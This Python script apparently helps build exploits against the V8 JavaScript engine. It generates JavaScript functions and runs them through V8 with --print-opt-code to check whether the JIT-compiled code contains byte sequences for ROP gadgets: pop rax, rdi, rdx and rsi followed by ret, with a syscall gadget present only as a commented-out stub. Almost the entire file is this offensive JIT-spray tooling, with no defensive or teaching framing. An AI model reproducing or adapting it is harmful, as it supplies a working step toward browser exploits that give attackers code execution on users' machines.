import os
import re
import sys
import pathlib


gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
rs_set = {'rdx', 'r11', 'rsi', 'rbx', 'rdi', 'r8', 'rcx'}
exec_path = ''
count = 12

def get_registers(log:str):
    f = open(log, 'r')
    base = 110
    nums = []
    for i in range(base, base + count):
        nums.append('0x' + str(i))

    lines = f.readlines()
    mm = dict()
    for line in lines:
        if line.find('0xc3') != -1 and line.find(',[') != -1:
            dd = line.split()
            # print gadget line
            print(dd[2], ' '.join(dd[3:]))
        for num in nums:
            if line.find(num) != -1 and line[line.find(num) - 1] == ',':
                if line[line.find('r') : line.find(num) - 1] in mm.keys():
                    print('conflict at ' + line[line.find('r') : line.find(num) - 1])
                else:
                    mm[line[line.find('r') : line.find(num) - 1]] = num[2:]
                    break
    return mm

def excute_js(js:str, filename:str)->bool:
    f = open(filename + '.js', 'w')
    f.write(js)
    f.close()
    os.system(exec_path + ' --print-opt-code ' + filename + '.js > ' + filename + '.txt')
    f = open(filename + '.txt', 'r')
    lines = f.readlines()
    f.close()
    for line in lines:
        for jsc in gadgets:
            if line.find('lea') != -1 and line.find(jsc) != -1:
                words = line.split()
                if len(words) > 3 and words[2].find(jsc) != -1 and words[2].find(jsc) % 2 == 0:
                    gadgets.remove(jsc)
                    return True
    
    return False

header = ''

tail = ''

def init_header(count:int):
    global header
    global tail
    header += \
'''
var array = new Uint8Array();
function syscall_jsc('''
    for i in range(count - 1):
        header += 'var' + str(i) + ', '
    header += 'var' + str(count - 1) + '){\n'
    base = 110
    for i in range(count):
        var = 't' + str(i)
        header += '\tvar ' + var + ' = var' + str(i) + ' & 0x' + str(base) + ';\n'
        base += 1
    
    tail += '\treturn '
    for i in range(count - 1):
        tail += 't' + str(i) + ' ' + ' + '
    tail += 't' + str(count-1) + ' | ('
    for i in range(count - 1):
        tail += 'i' + str(i) + ' + '
    tail += 'i' + str(count - 1) + ');\n}\n'

    tail += \
'''
for(var i = 0; i < 0x10000; i++)
{
'''
    tail += '\tsyscall_jsc('
    for i in range(count - 1):
        tail += '0xc' + str(i) + ', '
    tail += '0xc' + str(count - 1) + ');'
    tail += '\n}\n'


def generate_template(count:int):
    jsc = ''
    base = 11
    for i in range(count):
        jsc += '\tvar i' + str(i) + ' = t' + str(i) + ' + 0x' + str(i) + ';\n'
        base += 1

    excute_js(header + jsc + tail, 'test')

def gen_jsc(r1:str, r2:str, count:int, gadget:str):
    # 把t全部换成第二个寄存器对应的t
    base = 110
    b2 = 11
    jsc = ''
    for i in range(count):
        jsc += '\tvar i' + str(i) + ' = t' + str(int(rs_map[r2]) - base) + ' + 0x' + str(b2 + i) + ';\n'
    excute_js(header + jsc + tail, gadget + 'bak')
    f = open(gadget + 'bak.txt', 'r')
    lines = f.readlines()
    idx = -1
    for i, line in enumerate(lines):
        if line.find(r1) != -1 and line.find(r2) != -1 and line.find('leal') != -1 and line.find('*') == -1:
            if line[line.rfind('0x') + 2 : -2].isdigit():
                idx = int(line[line.rfind('0x') + 2 : -2]) - b2
                break
    
    f.close()
    if idx == -1:
        print('not found register pair')
        return ''
    jsc = ''
    for i in range(count):
        if i != idx:
            jsc += '\tvar i' + str(i) + ' = t' + str(int(rs_map[r2]) - base) + ' + 0x' + str(b2 + i) + ';\n'
        else:
            jsc += '\tvar i' + str(i) + ' = t' + str(int(rs_map[r2]) - base) + ' - 0x3d' + ';\n'
        
    return jsc

def generate_js(count):
    # 48 8d 5a c3             lea    rbx,[rdx-0x3d]
    # 48 8d 5e c3             lea    rbx,[rsi-0x3d]
    # 48 8d 58 c3             lea    rbx,[rax-0x3d]
    # 48 8d 5f c3             lea    rbx,[rdi-0x3d]

    jsc5ec3 = gen_jsc('rbx', 'rdx', count, '5ac3')
    if not excute_js(header + jsc5ec3 + tail, '5ac3'):
        print('generate 5ac3 failed')
    jsc5ec3 = gen_jsc('rbx', 'rsi', count, '5ec3')
    if not excute_js(header + jsc5ec3 + tail, '5ec3'):
        print('generate 5ec3 failed')
    jsc5fc3 = gen_jsc('rbx', 'rax', count, '58c3')
    if not excute_js(header + jsc5fc3 + tail, '58c3'):
        print('generate 58c3 failed')
    jsc58c3 = gen_jsc('rbx', 'rdi', count, '5fc3')
    if not excute_js(header + jsc58c3 + tail, '5fc3'):
        print('generate 5fc3 failed')
    # jsc0f05 = gen_syscall('rcx', 'rdi')
    # if not excute_js(header + jsc0f05 + tail, '0f05'):
        # print('generate 0f05 failed')
    



if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('plese input the path of v8')
        exit()
    
    exec_path = sys.argv[1]
    p = pathlib.Path(exec_path)
    if not p.is_file():
        print('path of v8 error')
        exit()
    
    init_header(count)
    generate_template(count)
    rs_map = get_registers('test.txt')
    if not rs_set < set(rs_map.keys()):
        print('needed ', rs_set)
        print('has', set(rs_map.keys()))
        print('resgister are not enough')
        exit()
    print(rs_map)
    generate_js(12)
    print('done')